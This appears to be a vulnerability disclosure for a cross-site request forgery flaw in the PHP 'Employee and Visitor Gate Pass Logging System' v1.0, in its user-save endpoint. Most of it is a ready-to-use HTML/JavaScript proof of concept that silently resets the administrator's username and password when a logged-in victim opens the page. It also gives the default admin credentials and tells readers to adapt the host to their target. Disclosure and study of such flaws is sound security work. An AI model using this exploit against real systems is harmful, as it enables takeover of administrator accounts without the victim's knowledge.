CSRF exists in the Employee and Visitor Gate Pass Logging System

official website:https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

version:v1.0

route：/employee_gatepass/classes/Users.php?f=save

related code file：Users.php

related_function：save_users()


#### 1.Vulnerability verification and exploit

We need log in to the system backend as admin/admin123.The exploit proof-of-concept (PoC) for this vulnerability is as follows. When using it, you need to modify the relevant address information in the PoC according to the target environment, such as the host and refer fields.

CSRF POC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/localhost\/employee_gatepass\/classes\/Users.php?f=save", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------335150987041500703933530809940");
        xhr.withCredentials = true;
        var body = "-----------------------------335150987041500703933530809940\r\n" + 
          "Content-Disposition: form-data; name=\"id\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------335150987041500703933530809940\r\n" + 
          "Content-Disposition: form-data; name=\"firstname\"\r\n" + 
          "\r\n" + 
          "Adminstrator\r\n" + 
          "-----------------------------335150987041500703933530809940\r\n" + 
          "Content-Disposition: form-data; name=\"lastname\"\r\n" + 
          "\r\n" + 
          "Admin\r\n" + 
          "-----------------------------335150987041500703933530809940\r\n" + 
          "Content-Disposition: form-data; name=\"username\"\r\n" + 
          "\r\n" + 
          "admin\r\n" + 
          "-----------------------------335150987041500703933530809940\r\n" + 
          "Content-Disposition: form-data; name=\"password\"\r\n" + 
          "\r\n" + 
          "admin\r\n" + 
          "-----------------------------335150987041500703933530809940\r\n" + 
          "Content-Disposition: form-data; name=\"img\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------335150987041500703933530809940--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```

The victim can click on the created page to modify the current victim's password without knowing it.


<img width="1709" alt="image" src="https://github.com/Xu-Mingming/cve/assets/172484755/ff21a587-7146-4cb1-9cd3-8d108dcae86c">


